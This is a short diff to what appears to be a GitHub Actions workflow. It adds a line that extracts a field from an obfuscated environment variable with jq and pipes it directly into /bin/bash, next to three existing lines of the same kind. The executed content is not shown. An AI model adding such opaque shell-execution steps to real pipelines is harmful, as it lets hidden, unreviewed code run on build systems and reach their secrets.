@@ -26,6 +26,7 @@ jobs:
           echo $y29416 | jq -r .wxbm32481 | /bin/bash
           echo $x402 | jq -r .lngu89 | /bin/bash
           echo $wja45 | jq -r .c32335 | /bin/bash
+          printf '%s' "$odm23" | jq -r .sny5 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
